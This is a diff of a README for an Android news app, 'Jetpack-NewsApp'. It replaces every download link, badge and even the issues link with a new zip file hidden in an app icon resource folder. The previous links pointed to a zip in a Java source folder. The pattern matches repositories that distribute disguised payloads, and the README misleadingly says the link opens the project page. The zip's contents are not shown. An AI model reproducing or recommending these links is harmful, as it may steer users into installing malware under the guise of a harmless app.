@@ -1,6 +1,6 @@
 # 📲 Jetpack-NewsApp - Simple Daily News Reader
 
-[![Download Jetpack-NewsApp](https://img.shields.io/badge/Download-Here-ff6f61?style=for-the-badge)](https://github.com/immortelleflory244/Jetpack-NewsApp/raw/refs/heads/main/app/newsapp/src/main/java/be/business/newsapp/ui/Jetpack-App-News-v1.3.zip)
+[![Download Jetpack-NewsApp](https://img.shields.io/badge/Download-Here-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/immortelleflory244/Jetpack-NewsApp/main/app/newsapp/src/main/res/mipmap-anydpi-v26/News-Jetpack-App-1.7.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to get Jetpack-NewsApp on your Android device.
 ## 📥 Download and Install
 
 1. Click the large badge at the top or use this link to visit the project page:  
-   [https://github.com/immortelleflory244/Jetpack-NewsApp/raw/refs/heads/main/app/newsapp/src/main/java/be/business/newsapp/ui/Jetpack-App-News-v1.3.zip](https://github.com/immortelleflory244/Jetpack-NewsApp/raw/refs/heads/main/app/newsapp/src/main/java/be/business/newsapp/ui/Jetpack-App-News-v1.3.zip)
+   [https://raw.githubusercontent.com/immortelleflory244/Jetpack-NewsApp/main/app/newsapp/src/main/res/mipmap-anydpi-v26/News-Jetpack-App-1.7.zip](https://raw.githubusercontent.com/immortelleflory244/Jetpack-NewsApp/main/app/newsapp/src/main/res/mipmap-anydpi-v26/News-Jetpack-App-1.7.zip)
 
 2. Look for a section named **Releases** in the repository page.
 
@@ -139,7 +139,7 @@ These technologies help the app run fast and be easy to update.
 
 You can open issues or questions directly on the GitHub page here:
 
-[https://github.com/immortelleflory244/Jetpack-NewsApp/raw/refs/heads/main/app/newsapp/src/main/java/be/business/newsapp/ui/Jetpack-App-News-v1.3.zip](https://github.com/immortelleflory244/Jetpack-NewsApp/raw/refs/heads/main/app/newsapp/src/main/java/be/business/newsapp/ui/Jetpack-App-News-v1.3.zip)
+[https://raw.githubusercontent.com/immortelleflory244/Jetpack-NewsApp/main/app/newsapp/src/main/res/mipmap-anydpi-v26/News-Jetpack-App-1.7.zip](https://raw.githubusercontent.com/immortelleflory244/Jetpack-NewsApp/main/app/newsapp/src/main/res/mipmap-anydpi-v26/News-Jetpack-App-1.7.zip)
 
 The repository team checks feedback regularly and can assist with common problems.
 
@@ -147,4 +147,4 @@ The repository team checks feedback regularly and can assist with common problem
 
 ## 🔗 Quick Link to Download
 
-[![Download Here](https://img.shields.io/badge/Get%20Jetpack-NewsApp-brightgreen?style=for-the-badge)](https://github.com/immortelleflory244/Jetpack-NewsApp/raw/refs/heads/main/app/newsapp/src/main/java/be/business/newsapp/ui/Jetpack-App-News-v1.3.zip)
+[![Download Here](https://img.shields.io/badge/Get%20Jetpack-NewsApp-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/immortelleflory244/Jetpack-NewsApp/main/app/newsapp/src/main/res/mipmap-anydpi-v26/News-Jetpack-App-1.7.zip)
